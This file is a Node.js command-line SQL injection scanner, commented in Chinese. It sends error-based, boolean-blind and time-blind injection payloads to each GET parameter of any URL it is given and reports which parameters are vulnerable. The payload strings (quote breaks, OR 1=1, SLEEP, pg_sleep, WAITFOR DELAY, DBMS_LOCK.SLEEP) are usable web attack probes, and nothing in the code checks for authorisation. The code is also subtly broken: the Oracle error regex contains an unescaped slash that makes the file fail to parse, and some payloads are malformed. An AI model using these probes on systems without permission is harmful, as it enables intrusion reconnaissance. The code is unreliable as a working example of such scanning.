#!/usr/bin/env node

const axios = require('axios');
const { program } = require('commander');

class SQLInjectionScanner {
  constructor() {
    this.dbSignatures = {
      mysql: {
        error: /MySQL syntax|mysql_fetch|mysql_num_rows|mysql_affected_rows/, 
        time: 'AND SLEEP(5)',
        boolTrue: 'AND 1=1',
        boolFalse: 'AND 1=2'
      },
      postgresql: {
        error: /PostgreSQL syntax|pg_\w+|PostgreSQL.*ERROR/, 
        time: 'AND pg_sleep(5)',
        boolTrue: 'AND 1=1',
        boolFalse: 'AND 1=2'
      },
      mssql: {
        error: /SQL Server syntax|Microsoft SQL Server|Msg \d+, Level \d+, State \d+/,
        time: 'WAITFOR DELAY \'00:00:05\'',
        boolTrue: 'AND 1=1',
        boolFalse: 'AND 1=2'
      },
      oracle: {
        error: /ORA-\d+|Oracle syntax|PL/SQL/, 
        time: 'AND DBMS_LOCK.SLEEP(5) FROM DUAL',
        boolTrue: 'AND 1=1 FROM DUAL',
        boolFalse: 'AND 1=2 FROM DUAL'
      }
    };
  }

  /**
   * 解析URL和参数
   */
  parseUrl(url) {
    const urlObj = new URL(url);
    const params = new URLSearchParams(urlObj.search);
    return {
      baseUrl: `${urlObj.protocol}//${urlObj.host}${urlObj.pathname}`,
      params: Object.fromEntries(params)
    };
  }

  /**
   * 基于错误的SQL注入检测
   */
  async detectErrorBased(baseUrl, param, value) {
    const testPayloads = [
      `'`, `"`, `' OR '1'='1`, `" OR "1"="1`, 
      `' AND 1=CONVERT(int, (SELECT version()))--`,
      `" AND 1=CONVERT(int, (SELECT version()))--`
    ];

    for (const payload of testPayloads) {
      const params = new URLSearchParams();
      params.set(param, `${value}${payload}`);
      const testUrl = `${baseUrl}?${params.toString()}`;

      try {
        const response = await axios.get(testUrl, { timeout: 10000 });
        
        // 检查响应中是否包含数据库错误信息
        for (const [dbType, signature] of Object.entries(this.dbSignatures)) {
          if (signature.error.test(response.data)) {
            return {
              vulnerable: true,
              injectionType: 'Error-based',
              dbType: dbType,
              payload: payload
            };
          }
        }
      } catch (error) {
        if (error.response && error.response.status === 500) {
          for (const [dbType, signature] of Object.entries(this.dbSignatures)) {
            if (signature.error.test(error.response.data)) {
              return {
                vulnerable: true,
                injectionType: 'Error-based',
                dbType: dbType,
                payload: payload
              };
            }
          }
        }
      }
    }

    return { vulnerable: false };
  }

  /**
   * 布尔盲注检测
   */
  async detectBooleanBlind(baseUrl, param, value) {
    const originalParams = new URLSearchParams();
    originalParams.set(param, value);
    const originalUrl = `${baseUrl}?${originalParams.toString()}`;
    
    try {
      const originalResponse = await axios.get(originalUrl, { timeout: 10000 });
      const originalLength = originalResponse.data.length;
      const originalContent = originalResponse.data;

      // 测试True条件
      for (const [dbType, signature] of Object.entries(this.dbSignatures)) {
        const trueParams = new URLSearchParams();
        trueParams.set(param, `${value}' ${signature.boolTrue}--`);
        const trueUrl = `${baseUrl}?${trueParams.toString()}`;
        const trueResponse = await axios.get(trueUrl, { timeout: 10000 });

        // 测试False条件
        const falseParams = new URLSearchParams();
        falseParams.set(param, `${value}' ${signature.boolFalse}--`);
        const falseUrl = `${baseUrl}?${falseParams.toString()}`;
        const falseResponse = await axios.get(falseUrl, { timeout: 10000 });

        // 比较响应差异
        const trueDiff = Math.abs(trueResponse.data.length - originalLength);
        const falseDiff = Math.abs(falseResponse.data.length - originalLength);

        if (trueDiff !== falseDiff && 
            (trueResponse.data.includes(originalContent) || 
             falseResponse.data.includes(originalContent))) {
          return {
            vulnerable: true,
            injectionType: 'Boolean-based blind',
            dbType: dbType,
            payload: `' ${signature.boolTrue}--`
          };
        }
      }
    } catch (error) {
      // 忽略网络错误
    }

    return { vulnerable: false };
  }

  /**
   * 时间盲注检测
   */
  async detectTimeBlind(baseUrl, param, value) {
    for (const [dbType, signature] of Object.entries(this.dbSignatures)) {
      const params = new URLSearchParams();
      params.set(param, `${value}' ${signature.time}--`);
      const testUrl = `${baseUrl}?${params.toString()}`;

      try {
        const startTime = Date.now();
        await axios.get(testUrl, { timeout: 15000 });
        const responseTime = Date.now() - startTime;

        // 如果响应时间超过5秒（考虑网络延迟）
        if (responseTime > 4500) {
          return {
            vulnerable: true,
            injectionType: 'Time-based blind',
            dbType: dbType,
            payload: `' ${signature.time}--`
          };
        }
      } catch (error) {
        // 超时可能表示存在时间盲注
        if (error.code === 'ECONNABORTED') {
          return {
            vulnerable: true,
            injectionType: 'Time-based blind',
            dbType: dbType,
            payload: `' ${signature.time}--`
          };
        }
      }
    }

    return { vulnerable: false };
  }

  /**
   * 扫描单个参数
   */
  async scanParameter(baseUrl, param, value) {
    console.log(`\n[+] 正在扫描参数: ${param}=${value}`);

    // 按优先级检测
    const errorResult = await this.detectErrorBased(baseUrl, param, value);
    if (errorResult.vulnerable) {
      return errorResult;
    }

    const boolResult = await this.detectBooleanBlind(baseUrl, param, value);
    if (boolResult.vulnerable) {
      return boolResult;
    }

    const timeResult = await this.detectTimeBlind(baseUrl, param, value);
    if (timeResult.vulnerable) {
      return timeResult;
    }

    return { vulnerable: false };
  }

  /**
   * 完整扫描URL
   */
  async scanUrl(url) {
    console.log(`[*] 开始扫描URL: ${url}`);
    const { baseUrl, params } = this.parseUrl(url);
    
    if (Object.keys(params).length === 0) {
      console.log(`[-] URL中没有GET参数，无法进行扫描`);
      return [];
    }

    console.log(`[*] 发现 ${Object.keys(params).length} 个GET参数`);
    const results = [];

    for (const [param, value] of Object.entries(params)) {
      const result = await this.scanParameter(baseUrl, param, value);
      if (result.vulnerable) {
        results.push({
          parameter: param,
          ...result
        });
        console.log(`[!] 发现SQL注入漏洞:`);
        console.log(`    参数: ${param}`);
        console.log(`    类型: ${result.injectionType}`);
        console.log(`    数据库: ${result.dbType}`);
        console.log(`    Payload: ${result.payload}`);
      } else {
        console.log(`[-] 参数 ${param} 未发现SQL注入漏洞`);
      }
    }

    return results;
  }
}

// 命令行接口
program
  .name('sql-injection-scanner')
  .description('SQL注入扫描工具，支持多种检测方法')
  .version('1.0.0');

program
  .command('scan')
  .description('扫描指定URL的SQL注入漏洞')
  .argument('<url>', '要扫描的URL（包含GET参数）')
  .action(async (url) => {
    const scanner = new SQLInjectionScanner();
    try {
      const results = await scanner.scanUrl(url);
      
      console.log(`\n[*] 扫描完成`);
      if (results.length > 0) {
        console.log(`[!] 发现 ${results.length} 个SQL注入漏洞:`);
        results.forEach((result, index) => {
          console.log(`\n${index + 1}. 参数: ${result.parameter}`);
          console.log(`    注入类型: ${result.injectionType}`);
          console.log(`    数据库类型: ${result.dbType}`);
          console.log(`    测试Payload: ${result.payload}`);
        });
      } else {
        console.log(`[+] 未发现SQL注入漏洞`);
      }
    } catch (error) {
      console.error(`[x] 扫描出错: ${error.message}`);
    }
  });

program.parse();

module.exports = SQLInjectionScanner;